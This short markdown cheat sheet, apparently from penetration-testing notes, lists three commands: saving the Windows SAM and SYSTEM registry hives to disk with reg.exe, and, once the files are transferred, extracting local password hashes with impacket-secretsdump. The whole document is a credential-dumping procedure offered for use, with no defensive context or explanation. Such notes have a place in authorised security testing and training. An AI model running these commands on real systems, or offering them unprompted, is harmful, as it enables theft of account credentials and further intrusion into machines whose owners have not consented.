# 1.Get Sam
```bash
reg.exe save hklm\sam c:\sam.bak
```

-----------------------

# 2.Get System
```bash
reg.exe save hklm\system c:\system.bak
```

-----------------------

# Once transfered dump hashes
```bash
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```
